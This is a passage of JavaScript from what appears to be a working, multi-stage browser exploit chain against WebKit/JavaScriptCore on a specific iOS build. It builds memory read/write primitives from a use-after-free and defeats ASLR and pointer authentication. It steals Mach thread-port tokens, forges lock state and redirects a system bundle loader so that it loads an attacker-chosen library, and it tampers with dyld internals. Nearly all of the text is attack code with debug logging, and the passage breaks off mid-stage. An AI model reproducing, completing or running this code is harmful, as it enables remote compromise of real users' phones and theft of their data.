    const globalFuncParseFloat = noPAC(read64(executable + structs.NativeExecutable_function));
    postMessage(`[globalFuncParseFloat] ${hex(globalFuncParseFloat)}`);
    const slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
    p.slide = slide;
    if (!p.slideApplied) {
        for (const k of Object.keys(offsets)) {
            if (offsets[k] >= 0x100000000n) offsets[k] += slide;
        }
        p.slideApplied = true;
    }

    let machoHdr = read64(offsets.jsc_base);
    if ((machoHdr & 0xffffffffn) !== 0xfeedfacfn) {
        return fail("jsc_base not found");
    }
    // --- open the JIT call-target allowlist (so redirected native calls pass) ---
    write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
    write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
    postMessage(`[jitAllowList] ${hex(read64(offsets.JavaScriptCore__jitAllowList + 8n))}`);
    postMessage(`[stage2] done; ASLR defeated, jitAllowList modified`);
}

// Worker forward chain (ctx -> JS globalScope). Field offsets live in
// VERSIONS[TARGET_BUILD].structs (read from the 23B85 WebCore binary via ipsw disass):
//   WorkerOrWorkletGlobalScope::m_script                  (vmIfExists @0x1a1a2cd48 / clearScript @0x1a1a2ccec)
//   WorkerOrWorkletScriptController::m_globalScopeWrapper (globalScopeWrapper @0x1a0199c58, Strong slot -> deref)
//   WorkerOrWorkletGlobalScope::m_thread = ThreadSafeWeakPtr (weak -> control-block deref, resolved in stage4)
const workerGlobalScope = (ctx) => {
    const controller = p.read64(ctx + structs.WorkerGlobalScope_script);
    const slot = p.read64(controller + structs.ScriptController_wrapper);   // Strong's m_slot (JSValue*)
    return p.read64(slot);                                                   // *m_slot = the JSDedicatedWorkerGlobalScope
};
const workerMarker = (ctx) => p.read64(p.read64(workerGlobalScope(ctx) + 8n));        // gs.butterfly[0]
const workerBitmap = (ctx) => p.read64(p.read64(workerGlobalScope(ctx) + 8n) + 8n);   // gs.butterfly[1]
// ---- Mach thread-port tokens (validated, no speculative derefs) ----
const OFF_WOT_GLOBALSCOPE = 0x20n;   // WorkerOrWorkletThread::m_globalScope back-ptr
const OFF_WOT_WTFTHREAD = 0x28n;   // WorkerOrWorkletThread::m_thread
const PTHREAD_SIG = 0x54485244n; // 'THRD'
const PTHREAD_TQE_NEXT = 0x10n;   // pthread_s.tl_plist.tqe_next

function tsdOffsetFor(pthreadPtr) {              // cached self-anchor scan
    if (p.tsdOff) return p.tsdOff;
    for (let off = 0x80n; off <= 0x120n; off += 8n) {
        if (p.read64(pthreadPtr + off) === pthreadPtr) {   // tsd[0] == THREAD_SELF
            p.tsdOff = off;
            postMessage(`[token] tsd offset = +${hex(off)} (expect 0xe0)`);
            return off;
        }
    }
    return 0n;
}

// =====================================================================
// Mach thread-port tokens (validated, no speculative derefs)
//
//   ctx --(+structs.WorkerGlobalScope_thread)--> WorkerOrWorkletThread
//         --(+0x28)--> WTF::Thread --(scan)--> pthread_t --> TSD slot 3
//
// Every computed pointer passes ptrOK before being dereferenced:
// on 23B85 userland data pointers live in 2^32..2^39 (heap 0x10ax..,
// stacks 0x16d/0x16f.., sharedCache 0x18..-0x1f..); anything outside
// that band is a packed small-int field, never a pointer.
// =====================================================================


function pollLocks(m) {
    const bundleLock = BigInt(m.bundleLock), lockWord = BigInt(m.lockWord);
    const workerPthread = BigInt(m.workerPthread), countSeed = BigInt(m.countSeed || '0x2');
    if (!sanityCheckRW()) p.reestablishRead64();
    postMessage('[poll] armed bundle=' + m.bundleLock + ' wPthread=' + m.workerPthread + ' seed=' + m.countSeed);
    let lastO = -1n, lastC = -1n, lastL = -1n, i = 0, forged = false, tForge = 0;
    const t0 = Date.now();
    while (Date.now() - t0 < (m.seconds || 10) * 1000) {
        const o = BigInt(p.read32(bundleLock));
        const c = BigInt(p.read32(bundleLock + 4n));
        if (!forged && o !== 0n) {                    // first nonzero owner = chainTok — fire even if we missed the 0-state
            p.write32le(bundleLock + 4n, c + countSeed);
            p.write32le(workerPthread + 0xf8n, o);
            const chkC = BigInt(p.read32(bundleLock + 4n));
            const chkT = BigInt(p.read32(workerPthread + 0xf8n));
            forged = true; tForge = Date.now();
            postMessage(`[poll] SEEDFORGE chainTok=${hex(o)} count ${hex(c)}>${hex(chkC)} tsd3=${hex(chkT)} (want ${hex(o)})`);
        }
        if (o !== lastO || c !== lastC) {
            postMessage(`[trace] {${hex(lastO)},${hex(lastC)}} > {${hex(o)},${hex(c)}}`);
            lastO = o; lastC = c;
        }
        if ((i++ & 7) === 0) {
            const l = BigInt(p.read32(lockWord));
            if (l !== lastL) { postMessage(`[trace] L ${hex(lastL)}>${hex(l)}`); lastL = l; }
        }
        if (forged && Date.now() - tForge > 2000) break;
    }
    postMessage(`[trace end] owner=${hex(lastO)} count=${hex(lastC)} forged=${forged}`);
}



const ptrOK = (v) => v >= 0x100000000n && (v >> 39n) === 0n && (v & 0x7n) === 0n;

function dumpObject(name, addr, bytes) {                 // reads stay INSIDE addr..addr+bytes
    for (let off = 0n; off < bytes; off += 8n) {
        const q = p.read64(addr + off);
        const lo = q & 0xffffffffn, hi = q >> 32n;
        const tag = ptrOK(q) ? "PTR" : (hi === 0n && lo !== 0n) ? `u32=${lo}` : "";
        postMessage(`[dump ${name}] +${off.toString(16).padStart(2, "0")} ${hex(q)} ${tag}`);
    }
    if (!buildScribbleRW(p.addrof, p.fakeobj)) {
        postMessage("[stage1] FAILED: could not build scribble R/W");
    }
    // Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
    // reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
    // the rebuild self-check failed.

    if (p.rwRebuildOk) {
        p.addrof = p.addrofRW;
        p.fakeobj = p.fakeobjRW;
        postMessage(`[stage1] addrof/fakeobj rebuilt on read64/write64 (park-robust); xSlot=${hex(p.xSlot)}`);
    } else {
        postMessage(`[stage1] WARNING: addrof/fakeobj rebuild self-check FAILED -> using UAF versions (break after park)`);
    }
    // verify the primitives are correct before we trust them downstream
    if (!sanityCheckRW()) {
        postMessage("[stage1] ABORT: R/W self-test failed");
    }
}
// Prefer the read64/write64-based addrof/fakeobj: they survive stage4's close()/park that
// reclaims the UAF's dangling cell and breaks the original ones. Fall back to UAF only if
// the rebuild self-check failed.



function tsdOffsetFor(pthreadPtr) {                      // self-anchor scan; cached
    if (p.tsdOff) return p.tsdOff;
    for (let off = 0x80n; off <= 0x120n; off += 8n) {
        if (p.read64(pthreadPtr + off) === pthreadPtr) { // tsd[0] == THREAD_SELF
            p.tsdOff = off;
            postMessage(`[token] tsd offset = +${hex(off)} (expect 0xe0)`);
            return off;
        }
    }
    return 0n;
}

function portFromWtfThread(thread) {
    for (let off = 0x20n; off <= 0xd0n; off += 8n) {
        const cand = p.read64(thread + off);
        if (!ptrOK(cand)) continue;                      // packed small-int field -> skip, no deref

        // port-shaped neighbor at +8 (m_platformThread) or +0xC (if uid/port swapped)
        const a = BigInt(p.read32(thread + off + 8n));
        const b = BigInt(p.read32(thread + off + 0xCn));
        const pa = a >= 0x100n && a < 0x10000000n && (a & 0xffn) !== 0n;
        const pb = b >= 0x100n && b < 0x10000000n && (b & 0xffn) !== 0n;
        if (!pa && !pb) continue;

        if (BigInt(p.read32(cand)) !== PTHREAD_SIG) continue;   // live ptr, wrong field

        const plat = pb ? b : a;
        const tsdOff = tsdOffsetFor(cand);
        const port1 = tsdOff ? BigInt(p.read32(cand + tsdOff + 0x18n)) : 0n;
        if (tsdOff && port1 !== plat) {
            postMessage(`[-] token mismatch m_platformThread=${hex(plat)} tsd[3]=${hex(port1)}`);
            continue;
        }

        p.knownPthread = cand;                           // anchor for mainThreadPort()
        postMessage(`[token] thread=${hex(thread)} pthread=${hex(cand)} m_handle=+${hex(off)} port=${hex(plat)}`);
        return plat;
    }
    postMessage(`[-] fingerprint failed; dumping Thread @ ${hex(thread)}`);
    dumpObject("thread", thread, 0x100n);
    return 0n;
}

function portFromContext(context) {
    const wot = p.read64(context + structs.WorkerGlobalScope_thread); // untagged weak-ptr word
    const back = p.read64(wot + OFF_WOT_GLOBALSCOPE);
    if (back < context || back >= context + 0x400n) {
        postMessage(`[-] back-ptr ${hex(back)} not in ctx ${hex(context)} — bad m_thread offset?`);
        return 0n;
    }
    return portFromWtfThread(p.read64(wot + OFF_WOT_WTFTHREAD));
}

const WTF_TSD_SLOT = 72n;   // WTF_THREAD_DATA_KEY = __PTK_FRAMEWORK_JAVASCRIPTCORE_KEY2

function tsdAnchor(pthreadPtr) {                     // per-struct self-anchor (23B85: +0xb0)
    for (let off = 0x80n; off <= 0x120n; off += 8n)
        if (p.read64(pthreadPtr + off) === pthreadPtr) return off;
    return 0n;
}

// worker token: two reads, shape-validated
function portFromWtfThread(thread) {
    const uid = BigInt(p.read32(thread + 0x30n));
    const port = BigInt(p.read32(thread + 0x34n));
    if (!(uid >= 1n && uid < 0x10000n && port >= 0x100n && port < 0x10000000n && (port & 0xffn) !== 0n)) {
        postMessage(`[-] bad uid/port ${hex(thread)} uid=${hex(uid)} port=${hex(port)}`);
        return 0n;
    }
    const pthread = p.read64(thread + 0x28n);
    if (ptrOK(pthread)) p.knownPthread = pthread;      // anchor for the main walk
    postMessage(`[token] thread=${hex(thread)} uid=${hex(uid)} port=${hex(port)} pthread=${hex(pthread)}`);
    return port;
}

// ============ pthread probe + main-thread token (23B85, empirical) ============
// 23B85 facts: pthread_t == struct base == stack region top.
//   struct+0x00 is NOT a magic sig (per-thread random u32) — never gate on it.
//   struct+0xb0 == stackaddr == pthread_t (self-referential) — NOT tsd[0].
//   WTF::Thread: m_handle +0x28 (== pthread_t), m_uid u32 +0x30, port u32 +0x34.

function dumpPthread(tag, pthread, wtfThread, expectPort) {
    if (!ptrOK(pthread)) { postMessage(`[dump ${tag}] bad pthread ${hex(pthread)}`); return; }
    postMessage(`[dump ${tag}] pthread=${hex(pthread)} wtfThread=${hex(wtfThread)} expectPort=${hex(expectPort)}`);
    let wtfOff = -1n;
    const selfs = [], lines = [];
    for (let off = 0x0n; off <= 0x400n; off += 8n) {
        const v = p.read64(pthread + off);
        if (v === 0n) continue;
        let m = '';
        if (v === pthread) { m += ' <SELF>'; selfs.push(off); }
        if (wtfThread && v === wtfThread) { m += ' <WTF-THREAD>'; wtfOff = off; }
        if (expectPort && (v & 0xffffffffn) === expectPort) m += ' <PORT32>';
        if (v > pthread && v < pthread + 0x900n) m += ' <INTO-STRUCT>';
        if (v >= pthread - 0x400000n && v < pthread - 0x1000n) m += ' <STACK>';
        lines.push(`+${off.toString(16)}=${hex(v)}${m}`);
    }
    while (lines.length) postMessage(`[dump ${tag}] ` + lines.splice(0, 6).join(' '));
    if (wtfOff < 0n) { postMessage(`[-] dump ${tag}: WTF-THREAD not under +0x400 — extend range`); return; }
    let chosen = 0n, chosenSlot = -1n;
    for (const s of selfs) {
        if (s >= wtfOff) continue;
        const d = wtfOff - s;
        if (d % 8n) continue;
        const slot = d / 8n;
        if (slot > 255n) continue;
        if (slot >= 64n && slot <= 79n) { chosen = s; chosenSlot = slot; break; }  // JSC key range
        if (chosenSlot < 0n) { chosen = s; chosenSlot = slot; }
    }
    if (chosenSlot >= 0n) {
        p.tsdBase = chosen; p.fastTlsSlot = chosenSlot;
        postMessage(`[+] tsdBase=+${chosen.toString(16)} fastTlsSlot=${chosenSlot} selfs=[${selfs.map(o => '+' + o.toString(16)).join(',')}]`);
    }
    // note: even if tsdBase lands on stackaddr instead of tsd[0], tsdBase+slot*8 is the
    // same address by construction — mainThreadPort() reads the right slot either way.
}

function mainThreadPort() {
    if (!p.knownPthread) { postMessage(`[-] mainThreadPort: no known pthread`); return 0n; }
    const tsdBase = p.tsdBase || 0xE0n;                                // dump-proven
    const slot = (p.fastTlsSlot !== undefined) ? p.fastTlsSlot : 92n;  // dump-proven (slot 92 @ +0x3C0)
    postMessage(`[main] tsdBase=+${tsdBase.toString(16)} slot=${slot}`);

    const list = [], seen = new Set();
    const push = (pt) => { const k = pt.toString(16); if (!seen.has(k)) { seen.add(k); list.push(pt); } };
    let cur = p.knownPthread;
    for (let n = 0; n < 64 && ptrOK(cur); n++) { push(cur); cur = p.read64(cur + 0x10n); }
    cur = p.read64(p.knownPthread + 0x18n);
    for (let n = 0; n < 64 && ptrOK(cur); n++) { const real = cur - 0x10n; push(real); cur = p.read64(real + 0x18n); }
    postMessage(`[main] ${list.length} pthreads on the list`);

    // NB: main's pthread struct is libpthread's STATIC struct (shared-cache __DATA) —
    // the +0xb0==pthread self-check does NOT hold for it. Validity = circular check only.
    let best = 0n, bestTid = 0n, bestPort = 0n, bestUid = 0n;
    for (const pt of list) {
        const selfB0 = p.read64(pt + 0xb0n);
        const bot = p.read64(pt + 0xb8n);
        const tid = p.read64(pt + 0xd8n);                           // kernel tid: main = minimum
        const tsd3 = BigInt(p.read32(pt + 0xF8n));                   // __TSD_MACH_THREAD_SELF (dump-proven)
        const wtfT = p.read64(pt + tsdBase + slot * 8n);
        let uid = 0n, port = 0n, rej = '';
        if (!ptrOK(wtfT)) rej += ' slot-null;';
        else if (p.read64(wtfT + 0x28n) !== pt) rej += ' no-circular;';
        else {
            uid = BigInt(p.read32(wtfT + 0x30n));
            port = BigInt(p.read32(wtfT + 0x34n));
            if (!(port >= 0x100n && port < 0x10000000n && (port & 0xffn) !== 0n)) rej += ' bad-port;';
            if (tsd3 !== port) rej += ` tsd3=${hex(tsd3)}!=port;`;
        }
        postMessage(`[main] pt=${hex(pt)} tid=${hex(tid)} stack=${hex(bot)}..${hex(selfB0)} self=${selfB0 === pt} uid=${hex(uid)} port=${hex(port)}${rej ? ' REJ' + rej : ''}`);
        if (rej || tid === 0n) continue;                               // tid==0: walk ran past the head
        if (!best || tid < bestTid) { best = wtfT; bestTid = tid; bestPort = port; bestUid = uid; }
    }
    if (!best) { postMessage(`[-] mainThreadPort: nothing validated`); return 0n; }
    postMessage(`[+] MAIN thread=${hex(best)} port=${hex(bestPort)} tid=${hex(bestTid)} uid=${hex(bestUid)} via min-tid`);
    if (bestUid !== 1n) postMessage(`[!] main uid != 1 — paste the table before stage 6`);
    p.mainWtfThread = best;
    return bestPort;
}


// one-time on-device validation of the slot number (run on the sub-worker)
function probeFastTLS(workerThread) {
    const pthread = p.read64(workerThread + 0x28n);
    const a = tsdAnchor(pthread);
    if (!a) return postMessage(`[ftls] no anchor ${hex(pthread)}`);
    postMessage(`[ftls] anchor=+${hex(a)} tid=${hex(p.read64(pthread + a - 8n))}`);
    for (let slot = 68n; slot <= 80n; ++slot) {
        const v = p.read64(pthread + a + slot * 8n);
        if (v === workerThread || (slot >= 70n && slot <= 74n))
            postMessage(`[ftls] slot ${slot}: ${hex(v)}${v === workerThread ? " <== WTF::Thread*" : ""}`);
    }
}


async function stage3() {
    const { offsets } = p;
    postMessage(`contexts_global = ${hex(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts)}`);
    const contexts = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
    postMessage(`contexts: ${hex(contexts)}`);
    const contexts_length = p.read64(contexts - 8n) >> 32n;
    postMessage(`contexts_length: ${hex(contexts_length)}`);
    const dlopen_workers = [];
    p.dlopen_workers = dlopen_workers;
    const seenCtx = new Set();   // the contexts map walk can revisit a slot -> dedupe by ctx
    for (let i = 0n; i < contexts_length; ++i) {
        const ptr = contexts + i * structs.ContextsMap_stride;
        const key = p.read64(ptr);
        if (!key) continue;
        const context = p.read64(ptr + structs.ContextsMap_value);
        const vtable = noPAC(p.read64(context));
        if (vtable != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) continue;

        const gs = workerGlobalScope(context);
        const id = workerMarker(context);
        const bitmap = workerBitmap(context);
        // ctx.m_thread (ThreadSafeWeakPtr) stores the WorkerOrWorkletThread* directly in its
        // m_objectOfCorrectType slot (a TaggedPtr -> mask the high tag bits), then +0x28 = WTF::Thread.
        const workerOrWorkletThread = noPAC(p.read64(context + structs.WorkerGlobalScope_thread));
        const thread = p.read64(workerOrWorkletThread + structs.WorkerThread_wtfThread);
        postMessage(`worker ctx=${hex(context)} gs=${hex(gs)} id=${hex(id)} bitmap=${hex(bitmap)} thread=${hex(thread)}`);
        dumpObject("thread", thread, 0x100n);
        // main's token (the one stage 6 actually needs for _lock):
        //   call the same function on main's WTF::Thread* from your context map:
        //       p.mainToken = portFromWtfThread(mainThread);
        //   — a Document has no m_thread, so portFromContext() does NOT apply there.
        //END GET TOKEN 
        const tag = id & 0xffffffffn;   // low 32 bits of the marker (int 0xffff0000.... or NaN-boxed 0xfffe0000....)
        const threadPort = portFromContext(context);
        if (gs === p.addrof(globalThis)) {
            p.myToken = threadPort;                      // the chain worker's own token
            postMessage(`[token] SELF=chain port=${hex(threadPort)}`);
        }

        if (tag === 0x11111111n || tag === 0x22222222n) {
            const ctxKey = context.toString();
            if (seenCtx.has(ctxKey)) continue;   // skip the duplicate slot (else classes[] overwrite each other)
            seenCtx.add(ctxKey);
            p.dlopen_workers.push({ ctx: context, thread, threadPort, id, bitmap });
        } else if (tag === 0x33333333n || tag === 0x44444444n) {
            // SPARE "fire workers": their close() runs the AVSpeech gate on their OWN thread for the
            // wake fires. One per wake (0x33333333 = worker1's, 0x44444444 = worker2's) because a
            // spare's bitmap is consumed by its first close() -- a spent spare can never re-fire.
            const ctxKey = context.toString();
            if (seenCtx.has(ctxKey)) continue;
            seenCtx.add(ctxKey);
            (p.spare_workers = p.spare_workers || []).push({ ctx: context, thread, threadPort, id });
        }
    }
    // Order deterministically by marker so p.dlopen_workers[0]=0x11111111 (close()'d in stage4),
    // [1]=0x22222222 (stage6). stage4 then plants classes[0]=TTSMagic (the class that triggers
    // AVLoadSpeech) into the worker that actually gets close()'d. Walk order is NOT stable.
    p.dlopen_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)));
    if (p.spare_workers) p.spare_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)));
    if (p.spare_workers && p.spare_workers.length) p.sub_worker = p.spare_workers[0];   // default spare = first (worker1's)
    p.mainToken = mainThreadPort();
    postMessage(`[stage3] dlopen_workers=${p.dlopen_workers.length} order=[${p.dlopen_workers.map(w => hex(w.id & 0xffffffffn)).join(",")}] spare_workers=${p.spare_workers ? p.spare_workers.length : 0} sub_worker=${p.sub_worker ? "yes" : "no"}`);
}
async function stage4() {
    postMessage(`[stage4] dlopen prepared from worker`);
    //start from p.dlopen_workers
    const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
    postMessage(`defaultLoader: ${hex(defaultLoader)}`);
    if (defaultLoader) {
        const paciza_nullfunc = p.read64(offsets.WebCore__softLinkDDDFACacheCreateFromFramework);
        postMessage(`paciza_nullfunc: ${hex(paciza_nullfunc)}`);
        const dispatchSource = p.read64(defaultLoader + structs.DefaultLoader_dispatchSource);
        postMessage(`dispatchSource: ${hex(dispatchSource)}`);
        const dispatchSomething = p.read64(dispatchSource + structs.DispatchSource_inner);
        postMessage(`dispatchSomething: ${hex(dispatchSomething)}`);
        const dispatchBlock = p.read64(dispatchSomething + structs.DispatchInner_block);
        postMessage(`dispatchBlock: ${hex(dispatchBlock)}`);
        p.write64(dispatchBlock + structs.DispatchBlock_invoke, paciza_nullfunc);
    }
    // worker1's park class: AVFAudio AVSpeechSynthesisProviderAudioUnit (fast AVFAudio loader that
    // COMPLETES its +initialize, unlike the TextToSpeech TTSMagic class which parks in Bambi
    // session-analytics and lags the once-gate completion -> the recurring dispatch-gate brk).
    // Using the wake-pool's spare class so Synthesizer/ProviderVoice stay fresh for the wake fires.
    const classes = [offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
    for (let i = 0; i < 2; ++i) {
        const worker = p.dlopen_workers[i];
        const wrappedBitmap = p.read64(worker.bitmap + structs.JSImageBitmap_wrapped);
        postMessage(`wrappedBitmap: ${hex(wrappedBitmap)}`);
        const imageBuffer = p.read64(wrappedBitmap + structs.ImageBitmap_buffer);
        postMessage(`imageBuffer: ${hex(imageBuffer)}`);
        p.write64(imageBuffer + structs.ImageBuffer_objcClass, classes[i]);
    }
    postMessage('Load TextToSpeech');
    await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
    postMessage('TextToSpeech Loaded');
    const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
    postMessage(`NSBundleTables: ${hex(NSBundleTables)}`);
    const loadedFrameworks = p.read64(NSBundleTables + structs.NSBundleTables_loadedFrameworks);
    postMessage(`loadedFrameworks: ${hex(loadedFrameworks)}`);
    const loadedFrameworks_length = p.read64(loadedFrameworks + structs.LoadedFrameworks_count);
    postMessage(`loadedFrameworks_length: ${hex(loadedFrameworks_length)}`);
    const loadedFrameworks_buffer = p.read64(loadedFrameworks + structs.LoadedFrameworks_buffer);
    postMessage(`loadedFrameworks_buffer: ${hex(loadedFrameworks_buffer)}`);
    let TextToSpeech_NSBundle;
    for (let i = 0n; i < loadedFrameworks_length; ++i) {
        const bundle = p.read64(loadedFrameworks_buffer + 8n * i);
        if (bundle <= 0x1_00000000n) continue;
        postMessage(`bundle[${i}]: ${hex(bundle)}`);
        const initialPath = p.read64(bundle + structs.NSBundle_initialPath);
        if (initialPath != offsets.AVFAudio__cfstr_SystemLibraryTextToSpeech) continue;
        TextToSpeech_NSBundle = bundle;
        break;
    }
    postMessage(`TextToSpeech_NSBundle: ${hex(TextToSpeech_NSBundle)}`);
    const TextToSpeech_CFBundle = p.read64(TextToSpeech_NSBundle + structs.NSBundle_cfBundle);
    postMessage(`TextToSpeech_CFBundle: ${hex(TextToSpeech_CFBundle)}`);
    p.TextToSpeech_NSBundle = TextToSpeech_NSBundle;
    p.TextToSpeech_CFBundle = TextToSpeech_CFBundle;

    // Re-arm the TextToSpeech CFBundle's loader: mark it unloaded (NSBundle/CFBundle flags),
    // reset AVLoadSpeechSynthesisImplementation's dispatch_once, and repoint the bundle's
    // executable path at a forged CFString {cstringOffset, cstringSize}. The NEXT realization of
    // an AVFAudio class then dlopens that path instead of the real speech engine.
    // Write a NUL-terminated ASCII C string into a fresh, GC-pinned buffer and return its
    // NUL-terminated ASCII C string via DarkSword's rope-flattening trick: `str + '\0'` builds a
    // JSRopeString, `delete rope_resolver[str]` forces ToPropertyKey -> flattens it into a
    // contiguous 8-bit StringImpl, then JSString+8 -> StringImpl*, StringImpl+8 -> the char data.
    // This is DarkSword's proven robust path (no Uint8Array backing-store games, no addrof+0x10
    // fragility). Lets us hand CoreFoundation/dyld an attacker-controlled C string.
    // C-STRINGS WITHOUT ROPES (2026-07-22, the error-return root): the old rope-flatten trick
    // (str+'\0' + delete -> contiguous StringImpl, JSString+8 -> StringImpl+8 -> data) only works
    // for POINTER-BACKED StringImpls. On 26.1's JSC, SHORT strings (libARI's 21-char path!) are
    // INLINE StringImpls: StringImpl+8 is the chars THEMSELVES, so the old code read the first 8
    // characters ('/usr/lib') as a "pointer" -> garbage exec path -> libARI load fails ->
    // worker1's block early-returns -> its dispatch_once completion brks on a walked token (the
    // recurring vphone gate brks; the "etsy" SIGSEGV is the same deref on a longer inline string).
    // This version writes the bytes into a fresh GC-pinned BigUint64Array with write64 --
    // deterministic for every length, no StringImpl-layout dependence.
    p.cstrBufs = p.cstrBufs || [];
    p.makeCString = (str) => {
        const buf = new BigUint64Array(0x40);   // 512 bytes, GC-pinned below
        p.cstrBufs.push(buf);
        const data = buf.data();
        const full = str + '\0';
        for (let i = 0; i < full.length; i += 8) {
            let q = 0n;
            for (let j = 0; j < 8 && i + j < full.length; j++) q |= BigInt(full.charCodeAt(i + j)) << BigInt(8 * j);
            p.write64(data + BigInt(i), q);
        }
        return { ptr: data, len: BigInt(str.length) };
    };

    p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
        p.write64(TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
        p.write8(TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
        p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cstringOffset);
        p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cstringSize);
        p.write64(TextToSpeech_CFBundle + structs.CFBundle_execPath, offsets.CFNetwork__gConstantCFStringValueTable);
        atexitHold();   // park the next worker's __cxa_atexit with a registered waiter (was bare 0x03, which erased the waiter registration)
    }

    // worker1 park target = libARI (DarkSword's original). Confirmed present + parks on vphone 2026-07-11
    // (imports ___cxa_atexit; deps = CoreFoundation/libc++/libSystem, all already loaded -> no +load crash).
    const targetDylib = "/usr/lib/libARI.dylib";
    const dylibPath = p.makeCString(targetDylib);
    postMessage(`[stage4] dlopen target '${targetDylib}' buffer @ ${hex(dylibPath.ptr)} len=${dylibPath.len}`);
    p.rearmCFBundleLoader(dylibPath.ptr, dylibPath.len);
}


async function stage5() {
    postMessage(`[stage5] overwriting p_InterposeTupleAll_buffer`);
    const {
        offsets
    } = p;

    const worker = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x11111111n);
    postMessage(`[stage5] worker.thread: ${hex(worker.thread)}`);
    const runtimeState = p.read64(offsets.libdyld__gAPIs);
    p.runtimeState = runtimeState;
    postMessage(`[stage5] runtimeState: ${hex(runtimeState)}`);
    const runtimeState_vtable = noPAC(p.read64(runtimeState));
    postMessage(`[stage5] runtimeState_vtable: ${hex(runtimeState_vtable)}`);
    const dyld_emptySlot = noPAC(p.read64(runtimeState_vtable));
    postMessage(`[stage5] dyld_emptySlot: ${hex(dyld_emptySlot)}`);
    const runtimeStateLock = p.read64(runtimeState + structs.RuntimeState_lock);
    postMessage(`[stage5] runtimeStateLock: ${hex(runtimeStateLock)}`);
    p.runtimeStateLock = runtimeStateLock;
    const p_InterposeTupleAll_buffer = runtimeState + structs.RuntimeState_interposeBuf;
    p.p_InterposeTupleAll_buffer = p_InterposeTupleAll_buffer;
    const p_InterposeTupleAll_size = runtimeState + structs.RuntimeState_interposeSize;
    p.p_InterposeTupleAll_size = p_InterposeTupleAll_size;
    postMessage(`[stage5] p_InterposeTupleAll_buffer: ${hex(p_InterposeTupleAll_buffer)}`);
    const stack_bottom = p.read64(worker.thread + structs.Thread_stackBottom);
    worker.stack_bottom = stack_bottom;
    postMessage(`[stage5] stack_bottom: ${hex(stack_bottom)}`);
    const stack_top = p.read64(worker.thread + structs.Thread_stackTop);
    worker.stack_top = stack_top;
    postMessage(`[stage5] stack_top: ${hex(stack_top)}`);
    p.create_jsstring = function (ptr, size) {
        const res = 'a'.repeat(8);
        const str = p.read64(p.addrof(res) + 8n);
        p.write64(str, size << 32n | structs.StringImpl_flags);
        p.write64(str + structs.StringImpl_data, ptr);
        return res;
    };
    p.efficient_search = function (begin, end, bytes) {
        const needle = String.fromCharCode(...bytes);
        const finder = p.create_jsstring(begin, end - begin);
        while (true) {
            const index = finder.indexOf(needle);
            if (index != -1) {
                postMessage(`[stage5] index:${index}`);
                return begin + BigInt(index);
            }
        }
    };
    // single-shot variant (no infinite retry) for the park-gate poll
    p.search_once = function (begin, end, bytes) {
        const needle = String.fromCharCode(...bytes);
        const finder = p.create_jsstring(begin, end - begin);
        const index = finder.indexOf(needle);
        return index === -1 ? 0n : begin + BigInt(index);
    };
    // PARK-GATE (2026-07-23, root-caused via lldb): the stage4 count-poll NEVER confirms worker1's
    // park ("NOT seen" every attempt -- 26.1 tracks waiters kernel-side, not in the userspace word),
    // so the spare's drop raced worker1's TT load and usually landed BEFORE the park -> worker1
    // missed the wake (the dominant "worker1 still parked" failure). worker1's parked stack provably
    // contains __cxa_atexit+0x28 (lldb thread #5 frame #4, its return address out of the mutex
    // acquire). Poll for that needle on worker1's stack and only let the choreography proceed to the
    // fire once worker1 is confirmed parked at the atexit mutex. Bounded; on miss proceed anyway so
    // the 00:33:11 fast-load case can't regress.
    {
        const __cxa = offsets.libsystem_c__cxa_atexit + 0x28n;
        // LOW 5 BYTES: the stack holds the PAC-SIGNED LR (lldb: 0x1136000198ebcbc8 at worker1's
        // frame record) -- the high 3 bytes are PAC, but bytes 0-4 are real address bits (byte4=0x01
        // is address bit 32, below the VA cutoff, preserved through signing). 5 bytes kills the
        // 4-byte collision risk while still ignoring the PAC field. An 8-byte needle never matches.
        const __nu = [Number(__cxa & 0xffn), Number((__cxa >> 8n) & 0xffn), Number((__cxa >> 16n) & 0xffn), Number((__cxa >> 24n) & 0xffn), Number((__cxa >> 32n) & 0xffn)];
        let __parked = false, __pw = 0;
        for (; __pw < 4000; __pw++) {
            try { if (p.search_once(stack_top, stack_bottom, __nu) !== 0n) { __parked = true; break; } } catch (e) { }
            if ((__pw & 0x1f) === 0) await spinYieldCool(__pw);   // ~10ms between probes
        }
        postMessage(`[stage5] worker1 park ${__parked ? `CONFIRMED (__cxa_atexit+0x28 on its stack, probe #${__pw})` : `NOT confirmed after ${__pw} probes -- proceeding anyway (fast-load case)`}`);
    }
    const dyld_offset = offsets.dyld__RuntimeState_emptySlot - dyld_emptySlot - p.slide;
    postMessage(`[stage5] dyld_offset: ${hex(dyld_offset)}`);
    p.dlopen_from_lambda_ret = offsets.dyld__dlopen_from_lambda_ret - p.slide - dyld_offset;
    postMessage(`[stage5] p.dlopen_from_lambda_ret: ${hex(p.dlopen_from_lambda_ret)}`);
    u64[0] = p.dlopen_from_lambda_ret;
    const needle = [u8[0], u8[1], u8[2], u8[3]];
    postMessage(`[stage5] searching for dlopen_from_lambda_ret in worker thread's stack [${hex(stack_top)}-${hex(stack_bottom)}]...`);
